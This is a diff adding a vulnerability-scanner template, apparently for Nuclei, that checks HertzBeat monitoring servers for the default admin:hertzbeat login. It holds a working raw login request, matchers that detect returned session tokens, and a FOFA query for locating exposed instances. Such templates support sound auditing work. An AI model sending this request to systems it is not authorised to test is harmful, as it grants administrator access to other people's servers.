@@ -1,0 +1,38 @@
+id: hertzbeat-default-login
+
+info:
+  name: HertzBeat - Default Login
+  author: qwtd
+  severity: high
+  description: HertzBeat default admin credentials admin:hertzbeat were discovered.
+  metadata:
+    verified: true
+    fofa: title="hertzbeat"
+  tags: HertzBeat
+
+http:
+  - raw:
+      - |
+        POST /api/account/auth/form HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN
+        Accept: application/json, text/plain, */*
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+        Content-Type: application/json
+        Cookie: _ga=GA1.1.1294047520.1732371701; _ga_13PPZZ7P4Y=GS1.1.1732371701.1.1.1732371729.0.0.0
+        Content-Length: 56
+
+        {"type":0,"identifier":"admin","credential":"hertzbeat"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '\"admin\"'
+          - 'refreshToken'
+          - 'token'
+          - '"code":0'
+      - type: status
+        status:
+          - 200
